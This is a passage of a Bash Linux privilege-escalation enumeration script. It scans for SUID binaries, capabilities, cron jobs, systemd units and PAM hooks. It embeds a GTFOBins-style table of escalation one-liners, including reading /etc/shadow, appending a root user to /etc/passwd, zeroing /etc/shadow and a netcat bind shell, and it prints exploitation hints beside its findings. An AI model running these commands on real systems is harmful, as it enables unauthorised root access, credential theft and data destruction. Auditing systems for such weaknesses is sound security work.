# ---------------------------------------------------------------------------

declare -A GTFO=(
    [bash]='bash -p'                     [sh]='sh -p'                     [dash]='dash -p'
    [zsh]='zsh'                          [ksh]='ksh -p'                   [csh]='csh'
    [fish]='fish'                        [rbash]='rbash -p'               [busybox]='busybox sh'
    [ash]='ash'                          [yash]='yash'
    [find]='find . -exec /bin/sh -p \; -quit'
    [vim]='vim -c ":!/bin/sh"'           [vi]='vi -c ":!/bin/sh"'         [nvim]='nvim -c ":!/bin/sh"'
    [view]='view -c ":!/bin/sh"'         [vim.basic]='vim.basic -c ":!/bin/sh"'
    [vim.tiny]='vim.tiny -c ":!/bin/sh"'
    [less]='less /etc/hostname  then  !/bin/sh'
    [more]='more /etc/hostname  then  !/bin/sh'
    [man]='man man  then  !/bin/sh'      [most]='most /etc/hostname  then  !sh'
    [awk]='awk "BEGIN{system(\"/bin/sh\")}"'      [gawk]='gawk "BEGIN{system(\"/bin/sh\")}"'
    [mawk]='mawk "BEGIN{system(\"/bin/sh\")}"'    [nawk]='nawk "BEGIN{system(\"/bin/sh\")}"'
    [python]='python -c "import os;os.system(\"/bin/sh\")"'
    [python2]='python2 -c "import os;os.system(\"/bin/sh\")"'
    [python3]='python3 -c "import os;os.system(\"/bin/sh\")"'
    [perl]='perl -e "exec \"/bin/sh\""'
    [ruby]='ruby -e "exec \"/bin/sh\""'  [irb]='irb  then  exec "/bin/sh"'
    [node]='node -e "require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})"'
    [php]='php -r "system(\"/bin/sh\");"' [php7]='php7 -r "system(\"/bin/sh\");"'
    [lua]='lua -e "os.execute(\"/bin/sh\")"'
    [tclsh]='tclsh  then  exec /bin/sh'
    [expect]='expect -c "spawn /bin/sh;interact"'
    [tar]='tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh'
    [zip]='zip /tmp/z.zip /etc/hostname -T -TT "sh #"'
    [gzip]='gzip -f /etc/hostname -c  (and SH=/bin/sh tricks)'
    [gunzip]='gunzip -c /etc/hostname.gz'
    [cp]='cp /bin/sh /tmp/rsh; chmod 4755 /tmp/rsh'
    [mv]='mv /etc/passwd /etc/passwd.bak  (destroy or replace)'
    [rm]='rm -f /etc/passwd  (denial)'
    [dd]='dd if=/dev/zero of=/etc/shadow'
    [tee]='echo pwn::0:0::/root:/bin/sh | tee -a /etc/passwd'
    [chmod]='chmod 4755 /bin/sh'
    [chown]='chown $(id -u) /etc/shadow'
    [chgrp]='chgrp $(id -g) /etc/shadow'
    [install]='install -m 4755 /bin/sh /tmp/x'
    [ln]='ln -sf /etc/shadow /tmp/shadow'
    [cat]='cat /etc/shadow'              [head]='head -c 9999 /etc/shadow'
    [tail]='tail -c 9999 /etc/shadow'    [sort]='sort /etc/shadow'
    [uniq]='uniq /etc/shadow'            [cut]='cut -c1- /etc/shadow'
    [base64]='base64 /etc/shadow | base64 -d'
    [xxd]='xxd /etc/shadow'              [od]='od -c /etc/shadow'
    [hexdump]='hexdump -C /etc/shadow'   [strings]='strings /etc/shadow'
    [nl]='nl /etc/shadow'                [pr]='pr -n /etc/shadow'
    [fold]='fold -w999 /etc/shadow'      [expand]='expand /etc/shadow'
    [sed]='sed -n "1,999p" /etc/shadow'
    [ed]='ed /etc/shadow'                [ex]='ex /etc/shadow'
    [nano]='nano /etc/shadow'            [pico]='pico /etc/shadow'
    [emacs]='emacs --eval "()"'          [joe]='joe /etc/shadow'
    [nmap]='nmap --interactive  then  !sh   (nmap < 2.02)'
    [mount]='mount -o bind /bin/sh /bin/mount'
    [umount]='umount /etc'
    [systemctl]='systemctl link /tmp/x.service && systemctl start x'
    [journalctl]='journalctl  then  !/bin/sh'
    [apt]='apt install -o APT::Update::Pre-Invoke::=/bin/sh x'
    [apt-get]='apt-get install -o APT::Update::Pre-Invoke::=/bin/sh x'
    [dpkg]='dpkg -i malicious.deb  (postinst runs as root)'
    [snap]='snap install --devmode ./x.snap'
    [docker]='docker run -v /:/mnt --rm -it alpine chroot /mnt sh'
    [podman]='podman run -v /:/mnt --rm -it alpine chroot /mnt sh'
    [git]='git -p help config  then  !/bin/sh'
    [ssh]='ssh -o ProxyCommand=";/bin/sh 0<&2 1>&2" x'
    [socat]='socat stdin exec:/bin/sh'
    [nc]='nc -lvnp 4444 -e /bin/sh'      [ncat]='ncat -l 4444 -e /bin/sh'
    [netcat]='netcat -l -p 4444 -e /bin/sh'
    [make]='make -f /tmp/Makefile  (shell in recipe)'
    [gcc]='gcc -o /tmp/x /tmp/x.c && /tmp/x'
    [cc]='cc -o /tmp/x /tmp/x.c && /tmp/x'
    [clang]='clang -o /tmp/x /tmp/x.c && /tmp/x'
    [as]='as -o /tmp/x.o /tmp/x.s'
    [ld]='ld -o /tmp/x /tmp/x.o'
    [gdb]='gdb -nx -ex "!/bin/sh" -ex quit'
    [strace]='strace -o /dev/null /bin/sh'
    [ltrace]='ltrace -o /dev/null /bin/sh'
    [openssl]='openssl req -engine /tmp/x.so'
    [xargs]='echo /bin/sh | xargs -I{} {}'
    [timeout]='timeout 3 /bin/sh'        [nice]='nice /bin/sh'
    [ionice]='ionice /bin/sh'            [stdbuf]='stdbuf -o0 /bin/sh'
    [taskset]='taskset 1 /bin/sh'        [setpriv]='setpriv /bin/sh'
    [watch]='watch -x sh -c "/bin/sh"'   [script]='script -q -c /bin/sh /dev/null'
    [expect2]='expect  (see expect)'
    [nsenter]='nsenter -t 1 -m -u -i -n -p -- /bin/sh'
    [unshare]='unshare -r /bin/sh'       [chroot]='chroot / /bin/sh'
    [nsenter2]='nsenter'
    [env]='env /bin/sh'                  [env3]='env'
    [flock]='flock -u / /bin/sh'
    [run-parts]='run-parts --report /tmp/dir  (executes your script)'
    [start-stop-daemon]='start-stop-daemon -S -x /bin/sh'
    [service]='service x start  (init script hijack)'
    [sudo]='sudo -l  then abuse'
    [su]='su -'
    [passwd]='passwd  (change root pw)'  [chsh]='chsh $(whoami) -s /bin/sh'
    [chfn]='chfn'
    [newgrp]='newgrp  (group change)'
    [mount.nfs]='mount.nfs  (NFS tricks)'
    [ssh-keysign]='ssh-keysign  (host key abuse)'
    [pkexec]='pkexec  (PwnKit if <0.105-26)'
    [polkit]='pkexec'
    [firejail]='firejail --join  (older firejail escape)'
    [screen]='screen -x  (attach to root session)'
    [tmux]='tmux -S /tmp/x attach  (if root socket)'
    [wall]='wall  (message injection)'
    [write]='write root pts/0'
    [at]='at  (queue a root job)'
    [crontab]='crontab -e  (schedule as the owner of the binary)'
    [logger]='logger  (log injection)'
    [docker-compose]='docker-compose run --rm -v /:/mnt alpine chroot /mnt sh'
    [ctr]='ctr run --mount type=bind,src=/,dst=/mnt,options=rbind:rw alpine sh'
    [crictl]='crictl exec'
    [nerdctl]='nerdctl run -v /:/mnt alpine chroot /mnt sh'
    [nginx]='nginx -c /tmp/x.conf  (worker runs as root if master suid)'
    [apache2]='apache2 -f /tmp/x.conf'
    [httpd]='httpd -f /tmp/x.conf'
    [dotnet]='dotnet  (arbitrary assembly)'
    [java]='java -jar /tmp/x.jar'
    [jjs]='jjs -e "Java.type(\"java.lang.Runtime\").getRuntime().exec(\"/bin/sh\")"'
    [jrunscript]='jrunscript -e "exec(\"/bin/sh\")"'
    [mongo]='mongo --eval "runProgram(\"/bin/sh\")"'
    [mysql]='mysql -e "\! /bin/sh"'
    [psql]='psql  then  \! /bin/sh'
    [sqlite3]='sqlite3  then  .shell /bin/sh'
    [redis-cli]='redis-cli  (module load / config set dir)'
    [tar2]='tar'
    [rsync]='rsync -e "sh -c \"sh 0<&2 1>&2\"" /dev/null x:/dev/null'
    [ip]='ip  (netlink)'
    [tcpdump]='tcpdump -w /dev/null -z /tmp/x   (older, --postrotate)'
    [hping3]='hping3 --lua /tmp/x.lua'
    [curl]='curl file:///etc/shadow'
    [wget]='wget file:///etc/shadow'
    [ping]='ping -c1 127.0.0.1  (suid flag abuse)'
    [ftp]='ftp  then  !/bin/sh'
    [scp]='scp -S /tmp/x x:y'
    [sftp]='sftp  then  !/bin/sh'
    [ld.so]='ld.so --library-path  (loader abuse)'
    [ld-linux-x86-64.so.2]='ld-linux-x86-64.so.2 /bin/sh'
    [chage]='chage  (passwd db)'
    [usermod]='usermod -p "" root'
    [crontab2]='crontab'
    [systemd-run]='systemd-run --scope /bin/sh'
    [install2]='install'
    [pigz]='pigz --stdout /etc/shadow'
    [bzip2]='bzip2 -c /etc/shadow'
    [xz]='xz -c /etc/shadow'
    [7z]='7z a -so /etc/shadow'
)

readonly -A GTFO

SUID_LIST="$OUTDIR/suid.txt"
SGID_LIST="$OUTDIR/sgid.txt"
INV="$OUTDIR/fs.tsv"
HAVE_INV=0

# ---------------------------------------------------------------------------
# One filesystem walk, then every permission check is an awk pass over the
# index. The first draft ran `find /` five separate times plus `getcap -r /`
# plus a recursive grep of $HOME; on a real disk that is minutes of I/O for
# information we can collect in a single pass.
# Index columns: 1=type 2=mode 3=uid 4=gid 5=size 6=path   (tab separated)
# ---------------------------------------------------------------------------
build_inventory() {
    if [ "$MODE" = "quick" ]; then
        info "quick mode: skipping the full inventory, using targeted scans"
        return 1
    fi
    if ! find --version 2>/dev/null | grep -q GNU; then
        info "non-GNU find(1): falling back to per-check walks"
        return 1
    fi
    if [ "$MODE" = "full" ]; then
        timeout 240 find / \( -path /proc -o -path /sys -o -path /dev -o -path /run \
            -o -path "$OUTDIR" \) -prune -o -printf '%y\t%m\t%u\t%g\t%s\t%p\n' 2>/dev/null > "$INV"
    else
        timeout 100 find / -xdev \( -path /proc -o -path /sys -o -path /dev -o -path /run \
            -o -path "$OUTDIR" \) -prune -o -printf '%y\t%m\t%u\t%g\t%s\t%p\n' 2>/dev/null > "$INV"
    fi
    [ -s "$INV" ] || { info "filesystem inventory came back empty"; return 1; }
    info "filesystem inventory: $(wc -l < "$INV") objects ($(du -h "$INV" 2>/dev/null | cut -f1))"
    return 0
}

# awk helpers over the index ------------------------------------------------
# mode digits: 1=special 2=user 3=group 4=other; w bit set for 2,3,6,7
AWK_W='function w(d){return ((d+0)%4)>=2}'
# groups the current user belongs to, as an awk lookup table
MYGRP=$(id -G 2>/dev/null | tr ' ' ',')

inv_perm() { # $1 = regex on the 4-digit mode's special digit, e.g. [4567] for SUID
    awk -F'\t' -v re="$1" '$1=="f" { m=sprintf("%04d",$2); if (substr(m,1,1) ~ re) print $6 }' "$INV"
}
inv_ww_files_in() { # $1 = path regex
    awk -F'\t' -v re="$1" "$AWK_W"'
        $1=="f" { m=sprintf("%04d",$2); if (w(substr(m,4,1)) && $6 ~ re) print $6 }' "$INV"
}
inv_writable_by_me() { # root-owned things this user can write
    awk -F'\t' -v me="$MYUID" -v grp="$MYGRP" "$AWK_W"'
        BEGIN { n=split(grp,g,","); for (i=1;i<=n;i++) mine[g[i]]=1 }
        $3=="0" && $3!=me {
            m=sprintf("%04d",$2);
            if (($4 in mine && w(substr(m,3,1))) || w(substr(m,4,1))) print $6
        }' "$INV"
}

build_inventory && HAVE_INV=1

sub "enumerating setuid binaries"
if [ "$HAVE_INV" = "1" ]; then
    inv_perm '[4567]' | sort -u > "$SUID_LIST"
elif [ "$MODE" = "quick" ]; then
    timeout 60 find /usr/bin /usr/sbin /bin /sbin /usr/local -type f -perm -4000 2>/dev/null > "$SUID_LIST"
else
    timeout 120 find / -xdev \( -path /proc -o -path /sys -o -path /dev \) -prune -o \
        -type f -perm -4000 -print 2>/dev/null > "$SUID_LIST"
fi
SUID_N=$(wc -l < "$SUID_LIST" 2>/dev/null || echo 0)
info "setuid files found: $SUID_N"

# distro-shipped setuid that is normally fine
KNOWN_SUID=" su sudo pkexec passwd chsh chfn gpasswd newgrp mount umount fusermount fusermount3
 su-exec ping ping6 traceroute traceroute6 wall write ssh-agent ssh-keysign sshd
 unix_chkpwd chage expiry sg nscd pmount pppd dotlockfile stunnel4 dbus-daemon
 exim4 sendmail postdrop procmail qmail-queue at crontab pam_timestamp_check
 ksu kpasswd locate mlocate updatedb bwrap chrome-sandbox Xorg xserver-xorg
 pam_extrausers_login cups-pk-helper lxd lxc-user-nic rootlesskit newuidmap newgidmap
 chrony ntpdate squid nagios nrpe openssh mtr snap-confine nsenter2 pam_tally2
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/openssh/ssh-keysign
 /usr/lib/eject/dmcrypt-get-device /usr/lib/policykit-1/polkit-agent-helper-1
 /usr/lib/snapd/snap-confine /usr/lib/vmware-tools /usr/lib/xorg/Xorg
 /usr/bin/sudo /usr/bin/passwd /usr/bin/mount /usr/bin/su /usr/bin/pkexec "

sub "unusual / custom setuid"
while IFS= read -r f; do
    [ -e "$f" ] || continue
    b=$(basename "$f")
    case " $KNOWN_SUID " in
        *" $f "*|*" $b "*) ;;
        *)  crit "non-standard SUID: $f ($(binfo "$f"))"
            case "$f" in
                /home/*|/tmp/*|/var/tmp/*|/dev/shm/*|/opt/*|/srv/*|/var/www/*)
                    crit "  ^ SUID binary in a user-writable location -- almost certainly a lab/planted escalation" ;;
            esac ;;
    esac
done < "$SUID_LIST"

sub "GTFOBins match on setuid binaries"
GTFO_HITS=0
while IFS= read -r f; do
    b=$(basename "$f")
    # distro-shipped setuid (sudo, su, passwd, mount, ping...) is expected: skip.
    case " $KNOWN_SUID " in
        *" $f "*|*" $b "*) continue ;;
    esac
    if [ -n "${GTFO[$b]:-}" ]; then
        crit "SUID $b ($f) is a GTFOBins escalation"
        hint "${GTFO[$b]}"
        GTFO_HITS=$((GTFO_HITS + 1))
    fi
done < "$SUID_LIST"
if [ "$GTFO_HITS" = "0" ]; then
    ok "no setuid binary matched the GTFOBins map"
else
    warn "$GTFO_HITS setuid GTFOBins hits -- each is usually a straight root shell"
fi

sub "setuid binary security properties"
while IFS= read -r f; do
    [ -e "$f" ] || continue
    # root-owned but writable by us = instant root
    if [ -w "$f" ] && [ "$(stat -c %u "$f" 2>/dev/null)" != "$MYUID" ]; then
        crit "SUID binary WRITABLE by $ME: $f -> replace it with /bin/sh -p"
    fi
    # suid + owned by us
    if [ "$(stat -c %u "$f" 2>/dev/null)" = "$MYUID" ] && [ "$MYUID" != "0" ]; then
        crit "SUID binary OWNED by $ME: $f"
    fi
    # suid binary in a directory we can rename/write
    d=$(dirname "$f")
    if [ -w "$d" ]; then
        crit "SUID binary sits in a directory writable by $ME ($d/$b) -> swap the file"
    fi
done < "$SUID_LIST"
ok "setuid ownership and directory writability reviewed"

sub "enumerating setgid binaries"
if [ "$HAVE_INV" = "1" ]; then
    inv_perm '[2367]' | sort -u > "$SGID_LIST"
elif [ "$MODE" = "quick" ]; then
    timeout 60 find /usr/bin /usr/sbin /bin /sbin /usr/local -type f -perm -2000 2>/dev/null > "$SGID_LIST"
else
    timeout 120 find / -xdev \( -path /proc -o -path /sys -o -path /dev \) -prune -o \
        -type f -perm -2000 -print 2>/dev/null > "$SGID_LIST"
fi
SGID_N=$(wc -l < "$SGID_LIST" 2>/dev/null || echo 0)
info "setgid files found: $SGID_N"
while IFS= read -r f; do
    [ -e "$f" ] || continue
    b=$(basename "$f")
    g=$(stat -c %G "$f" 2>/dev/null)
    case "$g" in
        shadow|disk|docker|lxd|libvirt|sudo|adm|backup|wireshark)
            crit "setgid $g on $f -- that group grants real privilege" ;;
        root)
            # setgid root is normal for interpreters only in odd builds; flag
            # only when the binary can execute commands or sits somewhere odd.
            if [ -n "${GTFO[$b]:-}" ]; then
                crit "setgid root on an interpreter/tool: $f"
                hint "runs with egid 0: this can read/write root:root files"
            else
                info "setgid root (usually benign): $f"
            fi ;;
        *) : ;;
    esac
    [ -w "$f" ] && crit "setgid file writable by $ME: $f"
done < "$SGID_LIST"
ok "setgid group review complete"

sub "writable directories with inherited setgid"
for d in /tmp /var/tmp /dev/shm /run/lock /var/crash /var/spool/samba; do
    [ -d "$d" ] || continue
    ww "$d" && {
        if [ "$(stat -c %a "$d")" = "1777" ] || [ "$(stat -c %a "$d")" = "3777" ]; then
            info "$d is sticky world-writable ($(stat -c %a "$d")) -- normal, but exploitable for file races"
        else
            crit "$d is world-writable WITHOUT sticky bit ($(stat -c %a "$d")) -> delete/replace other users' files"
        fi
    }
done

# ---------------------------------------------------------------------------
sec "LINUX CAPABILITIES"
# ---------------------------------------------------------------------------

if ! have getcap; then
    info "getcap not installed (libcap2-bin) -- capability checks skipped"
else
    CAPFILE="$OUTDIR/caps.txt"
    # getcap -r / walks every inode twice; capabilities only ever live on
    # executables, so walk the binary trees instead of the whole disk.
    if [ "$MODE" = "full" ]; then
        timeout 120 getcap -r / 2>/dev/null > "$CAPFILE"
    else
        timeout 45 getcap -r /usr/bin /usr/sbin /bin /sbin /usr/local /opt 2>/dev/null > "$CAPFILE"
    fi
    CAPN=$(wc -l < "$CAPFILE" 2>/dev/null || echo 0)
    ck; info "files with capabilities: $CAPN"
    if [ "$CAPN" = "0" ]; then ok "no file capabilities set"; fi

    sub "dangerous capability assignments"
    while IFS= read -r line; do
        [ -n "$line" ] || continue
        # distro-shipped helpers legitimately carry broad caps; note, don't scream
        case "$line" in
            */snap-confine*)
                info "snap-confine carries the expected broad caps (confinement is AppArmor's job): $line"
                continue ;;
            *dbus-daemon-launch-helper*|*polkit-agent-helper*|*systemd-resolve*|*rtkit-daemon*)
                info "distro helper with expected capabilities: $line"
                continue ;;
        esac
        case "$line" in
            *cap_setuid*|*cap_setgid*)
                crit "$line"
                hint "cap_setuid on an interpreter = instant root: ./python3 -c 'import os;os.setuid(0);os.system(\"/bin/sh\")'" ;;
            *cap_dac_read_search*)
                crit "$line"
                hint "read any file as root: tar -cvf /tmp/sh.tar /etc/shadow or getcap'd reader" ;;
            *cap_dac_override*)
                crit "$line"; hint "write any file regardless of perms -> append to /etc/passwd" ;;
            *cap_sys_admin*)
                crit "$line"
                hint "cap_sys_admin can mount: ./x -o bind / /mnt  (and often escapes containers)" ;;
            *cap_sys_ptrace*)
                crit "$line"; hint "ptrace a root process and inject a shell" ;;
            *cap_sys_module*)
                crit "$line"; hint "load a kernel module -- game over" ;;
            *cap_setfcap*)
                crit "$line"; hint "grant yourself any capability, e.g. setcap cap_setuid+ep /bin/sh" ;;
            *cap_chown*)
                warn "$line"; hint "chown /etc/shadow or any file to your user" ;;
            *cap_fowner*)
                warn "$line"; hint "bypass file permission checks on files you do not own" ;;
            *cap_net_raw*|cap_net_admin*)
                info "$line (network sniffing / routing)" ;;
            *cap_sys_resource*|*cap_sys_time*|*cap_sys_boot*)
                info "$line" ;;
            *cap_bpf*|*cap_perfmon*)
                warn "$line"; hint "BPF/perfmon access widens the kernel attack surface" ;;
            *cap_sys_chroot*)
                info "$line (chroot, pairs with a root-owned binary)" ;;
            *) info "$line" ;;
        esac
    done < "$CAPFILE"

    sub "current process capabilities"
    if have capsh; then
        capsh --print 2>/dev/null | sed -n '1,6p' | while IFS= read -r l; do
            [ -n "$l" ] && { info "$l"; }
        done
        if capsh --print 2>/dev/null | grep -q 'Current:.*cap_sys_admin'; then
            crit "this process already holds cap_sys_admin"
        fi
        if capsh --print 2>/dev/null | grep -q 'Current:.*cap_setuid'; then
            warn "this process holds cap_setuid"
        fi
    else
        grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)' /proc/self/status 2>/dev/null | while IFS= read -r l; do ck; info "$l"; done
    fi

    sub "capability sysctls"
    if [ -r /proc/sys/kernel/cap_last_cap ]; then
        info "cap_last_cap=$(cat /proc/sys/kernel/cap_last_cap)"
    fi
    if [ -r /proc/sys/kernel/cap_bprm_secureexec ]; then
        info "cap_bprm_secureexec=$(cat /proc/sys/kernel/cap_bprm_secureexec)"
    fi
    # file capabilities on a binary we can write
    while IFS= read -r line; do
        p=$(printf '%s' "$line" | awk '{print $1}')
        [ -n "$p" ] && [ -w "$p" ] && crit "capability binary writable by $ME: $p"
    done < "$CAPFILE"
    ck; ok "capability file writability reviewed"
fi

# ---------------------------------------------------------------------------
sec "CRON, TIMERS, SYSTEMD, HOOKS"
# ---------------------------------------------------------------------------

# Analyse a command that runs as root (or another user) for writable targets.
analyse_root_cmd() { # $1 = origin label, $2 = command string, $3 = run-as user
    local origin="$1" cmd="$2" runas="${3:-root}" p first
    [ -n "$cmd" ] || return 0

    # wildcard injection (tar/chown/rsync with *)
    case "$cmd" in
        *tar*' *'*|*rsync*' *'*|*chown*' *'*|*chmod*' *'*)
            warn "[$origin] wildcard in command -> wildcard injection possible: $cmd"
            hint "in the cron working dir create: --checkpoint=1 and --checkpoint-action=exec=/bin/sh"
            ;;
    esac

    # every absolute path in the command that exists
    for p in $(printf '%s' "$cmd" | grep -oE '(^|[[:space:]"'\'']) ?/[A-Za-z0-9._/+-]+' | tr -d '\"'\''' | tr -d ' '); do
        [ -e "$p" ] || continue
        if [ -w "$p" ]; then
            crit "[$origin] runs as $runas but target is WRITABLE by $ME: $p"
            hint "replace it: cp /bin/sh $p; chmod 4755 $p  -- fires at the next schedule tick"
        elif [ "$ASROOT" = "0" ]; then
            d=$(dirname "$p")
            if [ -w "$d" ] && [ ! -k "$d" ]; then
                crit "[$origin] target's directory is writable by $ME: $p (rename/replace attack)"
            fi
        fi
    done

    # bare command name -> which PATH does the scheduler use?
    first=$(printf '%s' "$cmd" | awk '{print $1}')
    case "$first" in
        /*|env|sh|bash|cd|echo|test|\[) : ;;
        *)
            warn "[$origin] runs bare '$first' -> PATH lookup by the scheduler"
            hint "if any dir in the scheduler PATH is writable, drop a '$first' there"
            ;;
    esac
}

sub "system crontab and cron directories"
for f in /etc/crontab /etc/anacrontab /etc/cron.d/* /var/spool/cron/crontabs/* /var/spool/cron/*; do
    [ -f "$f" ] || continue
    [ -w "$f" ] && crit "cron file writable by $ME: $f -> add your own root job"
    grep -E '^[^#]' "$f" 2>/dev/null | while IFS= read -r line; do
        case "$line" in
            *=*) continue ;;   # SHELL=/PATH= assignments handled below
        esac
        cmd=$(printf '%s' "$line" | sed -E 's/^[[:space:]]*([^[:space:]]+[[:space:]]+){5}//')
        runas=$(printf '%s' "$line" | awk '{print $6}')
        [ -n "$cmd" ] || continue
        ck
        info "[$f] $(printf '%s' "$line" | cut -c1-120)"
        analyse_root_cmd "$f" "$cmd" "${runas:-root}"
    done
    grep -E '^\s*PATH=' "$f" 2>/dev/null | while IFS= read -r pl; do
        ck; warn "[$f] $pl -- scheduler PATH, check each entry for writability"
        echo "$pl" | sed 's/.*=//' | tr ':' '\n' | while IFS= read -r d; do
            [ -n "$d" ] && [ -d "$d" ] && [ -w "$d" ] && crit "[$f] PATH entry writable: $d"
        done
    done
done

sub "user crontabs and at jobs"
if have crontab; then
    UC=$(run crontab -l 2>&1)
    if printf '%s' "$UC" | grep -qv 'no crontab'; then
        ck; info "crontab for $ME:"; printf '%s\n' "$UC" | sed 's/^/         /' | tee -a "$LOG"
        printf '%s\n' "$UC" | grep -vE '^#|^\s*$' | while IFS= read -r line; do
            cmd=$(printf '%s' "$line" | sed -E 's/^[[:space:]]*([^[:space:]]+[[:space:]]+){5}//')
            [ -n "$cmd" ] && { ck; analyse_root_cmd "user crontab" "$cmd" "$ME"; }
        done
    else
        ok "no crontab for $ME"
    fi
fi
for f in /etc/cron.allow /etc/cron.deny /etc/at.allow /etc/at.deny; do
    [ -e "$f" ] || continue
    [ -w "$f" ] && crit "$f writable -> grant yourself cron/at permission"
    perm_open "$f" 640 && warn "$f mode $(stat -c %a "$f")"
done
if have atq; then
    n=$(run atq | wc -l); info "pending at jobs: $n"
fi
for f in /etc/at.allow /var/spool/at; do [ -w "$f" ] && crit "$f writable"; done

sub "cron-adjacent execution paths"
for f in /etc/rc.local /etc/rc.d/rc.local /etc/init.d/*; do
    [ -f "$f" ] || continue
    [ -w "$f" ] && crit "$f writable -> runs as root at boot"
done
for d in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly \
         /etc/cron.yearly /var/spool/cron /var/spool/cron/crontabs /etc/init.d /etc/rc.local.d; do
    [ -d "$d" ] || continue
    [ -w "$d" ] && crit "directory writable by $ME: $d -> drop a script, it runs as root"
done
if [ -d /etc/cron.daily ]; then
    while IFS= read -r f; do
        [ -f "$f" ] || continue
        [ -w "$f" ] && crit "cron.daily script writable: $f"
        case "$f" in *.dpkg-*|*.rpmsave|*.rpmnew|*~|*.bak) warn "cron.daily leftover: $f" ;; esac
    done < <(find /etc/cron.daily -maxdepth 1 -type f 2>/dev/null)
fi

sub "logrotate (classic root privesc)"
for f in /etc/logrotate.conf /etc/logrotate.d/*; do
    [ -f "$f" ] || continue
    [ -w "$f" ] && crit "logrotate config writable: $f -> add a postrotate script running as root"
    if grep -qE '^\s*(postrotate|prerotate|firstaction|lastaction)' "$f" 2>/dev/null; then
        ck; warn "logrotate executes a script block: $f"
        hint "if that block or its target dir is writable you get root -- logrotten"
    fi
    # writable log destination directory
    grep -oE '^\s*/[^ {]+' "$f" 2>/dev/null | tr -d ' ' | while IFS= read -r lg; do
        [ -e "$lg" ] || continue
        d=$(dirname "$lg")
        [ -w "$d" ] && crit "logrotate target dir writable: $d (log $lg) -> symlink race"
    done
done
ok "logrotate configs reviewed"

sub "systemd units and timers"
UNIT_DIRS="/etc/systemd/system /run/systemd/system /usr/lib/systemd/system /lib/systemd/system"
for d in $UNIT_DIRS; do
    [ -d "$d" ] || continue
    [ -w "$d" ] && crit "systemd unit directory writable: $d -> install your own root service"
done
UFILE="$OUTDIR/units.txt"
# -type f skips the .wants/ symlink farms (they duplicate the real units)
{
    for d in /etc/systemd/system /run/systemd/system; do
        [ -d "$d" ] && timeout 20 find "$d" -maxdepth 2 -type f \( -name '*.service' -o -name '*.timer' \) 2>/dev/null
    done
    for d in /usr/lib/systemd/system /lib/systemd/system; do
        [ -d "$d" ] && timeout 20 find "$d" -maxdepth 1 -type f \( -name '*.service' -o -name '*.timer' \) 2>/dev/null
    done
} | sort -u | head -400 > "$UFILE"
UN=$(wc -l < "$UFILE" 2>/dev/null); UN=${UN:-0}
info "systemd units inspected: $UN (fast-path: maxdepth 2, /etc first)"

while IFS= read -r u; do
    [ -f "$u" ] || continue
    [ -w "$u" ] && crit "unit file writable: $u -> rewrite ExecStart and restart it"
    # one grep per unit, then parse in-shell
    while IFS= read -r kv; do
        case "$kv" in
            Exec*=*)
                ex=${kv#*=}
                ex=${ex#"${ex%%[![:space:]]*}"}          # trim leading space
                [ -n "$ex" ] || continue
                while [ -n "$ex" ]; do
                    case "$ex" in [!@+-:|]*) break ;; *) ex=${ex#[!@+-:|]} ;; esac
                done
                p=${ex%% *}
                case "$p" in /*) : ;; *) continue ;; esac
                if [ -e "$p" ] && [ -w "$p" ]; then
                    crit "unit $u Exec target writable by $ME: $p"
                else
                    dd=$(dirname "$p")
                    [ -d "$dd" ] && [ -w "$dd" ] && crit "unit $u Exec dir writable: $dd ($p)"
                fi ;;
            EnvironmentFile=*)
                ef=${kv#*=}; ef=${ef#-}; ef=${ef%% *}
                [ -f "$ef" ] && [ -w "$ef" ] && crit "unit $u EnvironmentFile writable: $ef -> inject LD_PRELOAD" ;;
            User=root|User=0)
                info "root service: $(basename "$u")" ;;
        esac
    done < <(grep -hE '^[[:space:]]*(Exec[A-Za-z]*|EnvironmentFile|User)=' "$u" 2>/dev/null | tr -d '"')
done < "$UFILE"

if have systemctl; then
    sub "active systemd timers"
    run systemctl list-timers --all --no-pager 2>/dev/null | head -25 | sed 's/^/         /' | tee -a "$LOG"
    ck; info "timers listed above; each Next-Elapse is a scheduled trigger"
fi

sub "other root-run hook locations"
for f in /etc/profile /etc/bash.bashrc /etc/bashrc /etc/profile.d/* /etc/environment \
         /etc/zsh/zshrc /etc/zsh/zprofile /root/.bashrc /root/.profile /root/.bash_profile; do
    [ -e "$f" ] || continue
    if [ -w "$f" ]; then crit "shell init writable by $ME: $f -> code runs when root logs in"; fi
    [ "$ASROOT" = "0" ] && [ -r "$f" ] && uid_own=$(stat -c %u "$f" 2>/dev/null) && [ "$uid_own" = "0" ] && ck && info "root-owned init readable: $f"
done
for d in /etc/apt/apt.conf.d /etc/apt/conf.d; do
    [ -d "$d" ] || continue
    [ -w "$d" ] && crit "$d writable -> APT::Update::Pre-Invoke runs as root"
    while IFS= read -r f; do
        [ -w "$f" ] && crit "APT hook writable: $f"
    done < <(find "$d" -maxdepth 1 -type f 2>/dev/null)
done
if [ -d /etc/NetworkManager/dispatcher.d ]; then
    perm_open /etc/NetworkManager/dispatcher.d 750 && warn "NetworkManager dispatcher.d mode $(stat -c %a /etc/NetworkManager/dispatcher.d)" || ok "dispatcher.d mode ok"
    while IFS= read -r f; do
        [ -w "$f" ] && crit "NetworkManager dispatcher script writable: $f (runs as root on network events)"
    done < <(find /etc/NetworkManager/dispatcher.d -maxdepth 1 -type f 2>/dev/null)
fi
for d in /etc/udev/rules.d /lib/udev/rules.d /usr/lib/udev/rules.d; do
    [ -d "$d" ] || continue
    [ -w "$d" ] && crit "$d writable -> udev rule with RUN+= executes as root on device events"
done
for d in /etc/ld.so.conf.d /etc/pki /etc/ssl/private; do
    [ -d "$d" ] && [ -w "$d" ] && crit "$d writable -> library or key material injection"
done
if [ -e /etc/ld.so.preload ]; then
    if [ -w /etc/ld.so.preload ]; then
        crit "/etc/ld.so.preload WRITABLE -> every binary loads your .so as root"
        hint "echo /tmp/x.so > /etc/ld.so.preload"
    else
        ok "/etc/ld.so.preload exists but not writable"
    fi
else
    info "no /etc/ld.so.preload (good)"
fi
for f in /etc/pam.d/*; do
    [ -f "$f" ] || continue
    [ -w "$f" ] && crit "PAM config writable: $f -> pam_exec/pam_python arbitrary code as root"
    grep -qE 'pam_exec|pam_python' "$f" 2>/dev/null && { warn "$f uses pam_exec/pam_python"; }
done
ok "PAM configs reviewed"
# ---------------------------------------------------------------------------
